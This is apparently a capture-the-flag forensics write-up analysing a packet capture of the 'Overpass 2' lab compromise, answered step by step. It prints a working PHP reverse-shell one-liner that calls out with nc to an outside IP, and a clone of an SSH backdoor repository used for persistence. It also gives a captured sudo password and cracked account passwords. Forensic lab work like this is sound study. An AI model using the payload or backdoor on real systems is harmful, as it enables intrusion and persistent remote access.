# Overpass 2 - Hacked
* SOC team noticed suspicious activity on late night shift.
* Packets captured as attack happened.
## Forensics - Analyse the PCAP
1. What was the URL of the page they used to upload a reverse shell?
   * Follow TCP Stream (`tcp.stream eq 1`).
```
POST /development/upload.php HTTP/1.1
```
2. What payload did the attacker use to gain access?
  * Follow TCP Stream (`tcp.stream eq 1`).
```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```
3. What password did the attacker use to privesc?
   * Follow TCP Stream (`tcp.stream eq 3`).
```
[sudo] password for james: whenevernoteartinstant
```
4. How did the attacker establish persistence?
   * Follow TCP Stream (`tcp.stream eq 3`).
```
git clone https://github.com/NinjaJc01/ssh-backdoor
```
5. Using the fasttrack wordlist, how many of the system passwords were crackable?
   1. Copy and paste exposed shadow file from PCAP `tcp.stream eq3` into "shadowfile" file.
   2. Run JtR against shadowfile.
```
john --wordlist=/usr/share/wordlists/fasttrack.txt shadowfile
[...snip...]
secret12         (bee)     
abcd123          (szymex)     
1qaz2wsx         (muirland)     
secuirty3        (paradox)
[...snip...]
```
